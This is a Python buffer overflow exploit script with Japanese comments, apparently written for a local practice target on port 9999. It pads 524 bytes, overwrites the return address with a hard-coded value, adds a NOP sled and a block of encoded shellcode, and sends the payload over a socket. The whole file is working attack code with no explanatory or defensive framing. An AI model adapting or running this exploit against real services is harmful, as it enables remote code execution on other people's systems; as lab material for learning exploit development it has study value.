#!/usr/bin/env python3
import socket
from time import sleep

# バッファ構築（バイト型で最初から組む）
junk = b"A" * 524
eip  = b"\xF3\x12\x17\x31"  # little endian address（例）
nops = b"\x90" * 8
shellcode =  b""
shellcode += b"\xbd\xfd\xad\xbb\x97\xd9\xec\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\x32\x31\x68\x12\x83\xe8\xfc"
shellcode += b"\x03\x95\xa3\x59\x62\x99\x54\x1f\x8d\x61\xa5"
shellcode += b"\x40\x07\x84\x94\x40\x73\xcd\x87\x70\xf7\x83"
shellcode += b"\x2b\xfa\x55\x37\xbf\x8e\x71\x38\x08\x24\xa4"
shellcode += b"\x77\x89\x15\x94\x16\x09\x64\xc9\xf8\x30\xa7"
shellcode += b"\x1c\xf9\x75\xda\xed\xab\x2e\x90\x40\x5b\x5a"
shellcode += b"\xec\x58\xd0\x10\xe0\xd8\x05\xe0\x03\xc8\x98"
shellcode += b"\x7a\x5a\xca\x1b\xae\xd6\x43\x03\xb3\xd3\x1a"
shellcode += b"\xb8\x07\xaf\x9c\x68\x56\x50\x32\x55\x56\xa3"
shellcode += b"\x4a\x92\x51\x5c\x39\xea\xa1\xe1\x3a\x29\xdb"
shellcode += b"\x3d\xce\xa9\x7b\xb5\x68\x15\x7d\x1a\xee\xde"
shellcode += b"\x71\xd7\x64\xb8\x95\xe6\xa9\xb3\xa2\x63\x4c"
shellcode += b"\x13\x23\x37\x6b\xb7\x6f\xe3\x12\xee\xd5\x42"
shellcode += b"\x2a\xf0\xb5\x3b\x8e\x7b\x5b\x2f\xa3\x26\x36"
shellcode += b"\xae\x31\x5d\x74\xb0\x49\x5d\x29\xd9\x78\xd6"
shellcode += b"\xa6\x9e\x84\x3d\x83\x51\xcf\x1f\xa2\xf9\x96"
shellcode += b"\xca\xf6\x67\x29\x21\x34\x9e\xaa\xc3\xc5\x65"
shellcode += b"\xb2\xa6\xc0\x22\x74\x5b\xb9\x3b\x11\x5b\x6e"
shellcode += b"\x3b\x30\x35\xff\xb7\xde\xb9\x9e\x53\x0f\x5c"
shellcode += b"\x19\xf9\x4f"

payload = junk + eip + nops + shellcode

# ソケット通信
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))

try:
    data = s.recv(1024)
    print(data.decode(errors="ignore") + '\n')
except socket.error as err:
    print(err)

s.sendall(payload)

try:
    data = s.recv(1024)
    print(data.decode(errors="ignore") + '\n')
except socket.error as err:
    print(err)

s.close()
